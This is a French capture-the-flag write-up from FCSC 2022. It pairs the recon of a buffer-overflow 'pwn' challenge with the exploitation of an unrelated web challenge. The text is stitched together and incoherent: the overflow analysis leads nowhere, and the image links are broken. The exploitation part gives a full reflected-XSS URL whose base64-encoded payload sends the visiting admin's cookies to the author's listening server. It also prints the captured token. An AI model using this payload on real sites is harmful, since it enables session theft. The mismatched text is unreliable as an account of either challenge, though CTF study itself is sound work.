# Trop Facile
![Chall](https://github.com/Numb3rsProprety/FCSC2022/blob/main/Gare-Au-Gorille/gareaugorille.PNG?raw=true)


- Category: `Pwn`
- Points: `100` => `100`
- Difficulty: Intro
- Solves: `300`


**Description**

> Agent, suite à une mission périlleuse, vos collègues ont réussi à s'emparer d'un binaire s'exécutant sur une des machines de Hallebarde. Après une analyse poussée, ils ont réussi à extraire ce qui semblait être la meilleure version du code source. Vous êtes chargé de la dernière étape : essayez d'exploiter le binaire pour en tirer quelque chose.
>
>
>


**Attachments**

- `compromis.c, compromis`

### :book: Introduction

 Etant donne que c'etait mon tout premier chall de pwn c'etait plutot interessant et assez rapide a faire.

**Recon**
![home](![image](https://user-images.githubusercontent.com/64932654/167711362-83b80e2f-f083-4199-ac3a-598aba2f2f82.png))
- Le code source est relativement simple:
    - **Il y a une variable buf de 40bytes qui prend comme valeur un fgets de 49 bytes l'input**
    - **Une valeur check qui est egal a "0xcafebebe"**
    - **Une valeur key qui est egal a "0xdeadbeef"**
    - **On remarque que si key est egal a "0xcafebebe" et check a "0xdeadbeef" un shell se lance**
Il faut donc depasser sur les variables key et check pour ouvrir un shell.

![xss](https://github.com/Numb3rsProprety/FCSC2022/blob/main/Gare-Au-Gorille/xss.PNG?raw=true)

Ceci etant fait je cherche un moyen pour exploiter cette faille et je me met donc a examiner la fonction report du site.
En cliquant sur le boutton report le site me redirige vers ce lien:
` https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=meme_01.jpg `
Le parametre search est reutilise dans le report.
On peut donc utiliser ce parametre pour injecter un payload qui renverra le cookie de l'utilisateur executant le programme a notre serveur distant.
Si l'on envoie ce payload a l'administrateur il executera le code javascript et nous enverra son token et nous permettra de nous connecter avec son compte
### :arrows_counterclockwise: Exploitation

Avant tout j'ai setup un serveur d'ecoute pour pouvoir recevoir les cookies.
Je fait un payload qui envoie le token vers mon serveur
(cette data sheet m'a beaucoup aide: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
notre payload request de fin ressemble donc a ca:
https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=eval(atob('ZG9jdW1lbnQubG9jYXRpb24gPSAnaHR0cDovL2xvY2FsaG9zdDo4MC8/Y29va2llPScgKyBkb2N1bWVudC5kb21haW4rJzogJytkb2N1bWVudC5jb29raWU='))

En attendant un peu on recoit le token sur notre serveur: O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45
On peut maintenant acceder au flag:
```
Congrats here is the flag

Flag: `FCSC{14b15680de4e305b89eaa2a07b137abf4e39b5773f39a4ea7155ca5387c6f59e}`


```

